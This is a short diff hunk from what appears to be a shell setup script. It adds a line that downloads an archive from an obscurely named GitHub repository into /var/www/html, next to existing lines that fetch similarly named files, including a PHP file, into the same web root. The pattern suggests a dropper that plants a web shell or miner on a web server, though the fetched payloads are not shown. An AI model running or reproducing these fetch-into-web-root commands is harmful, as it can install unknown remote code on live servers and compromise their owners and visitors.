@@ -144,6 +144,8 @@ tar -xvf ./google844.tar.xz
 
 cd /var/www/html
 
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux8444.tar.gz
+
 wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgooglework8474
 
 wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgooglework8474.php
